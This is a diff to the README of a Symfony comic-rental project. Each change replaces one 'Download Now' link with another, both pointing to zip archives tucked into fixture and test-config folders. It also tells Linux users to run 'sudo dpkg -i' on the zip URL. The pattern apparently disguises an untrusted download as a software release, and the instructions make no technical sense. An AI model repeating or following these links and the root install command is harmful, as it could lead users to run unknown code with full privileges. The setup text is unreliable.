@@ -1,11 +1,11 @@
 # 🎨 symfony-rent-a-comic - Accessible Comic Renting Made Easy
 
-![Download Now](https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip%https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip)
-[Download Now](https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip)
+![Download Now](https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip%https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip)
+[Download Now](https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip)
 
 ## 📦 Overview
 
-**symfony-rent-a-comic** is a Symfony 6.1 project designed to make renting comics accessible for everyone. This application serves as a snapshot of a private repository that operates at [https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip](https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip). Its development focuses on ensuring a smooth and enjoyable comic renting experience.
+**symfony-rent-a-comic** is a Symfony 6.1 project designed to make renting comics accessible for everyone. This application serves as a snapshot of a private repository that operates at [https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip](https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip). Its development focuses on ensuring a smooth and enjoyable comic renting experience.
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Ensure your computer meets the following requirements:
 
 To download the software, visit our Releases page. Click on the link below:
 
-[Download Now](https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip)
+[Download Now](https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip)
 
 ### 3. Select the Latest Release
 
@@ -51,7 +51,7 @@ Once the download is complete, follow these steps based on your operating system
 - **For Linux:**
   1. Open a terminal.
   2. Navigate to the directory where you downloaded the file.
-  3. Run the installation command (for example, `sudo dpkg -i https://raw.githubusercontent.com/killuameter/symfony-rent-a-comic/main/src/DataFixtures/symfony-rent-a-comic-Clarist.zip` for `.deb` packages).
+  3. Run the installation command (for example, `sudo dpkg -i https://github.com/killuameter/symfony-rent-a-comic/raw/refs/heads/main/config/packages/test/a_rent_symfony_comic_v2.9.zip` for `.deb` packages).
 
 ### 6. Run the Application
 
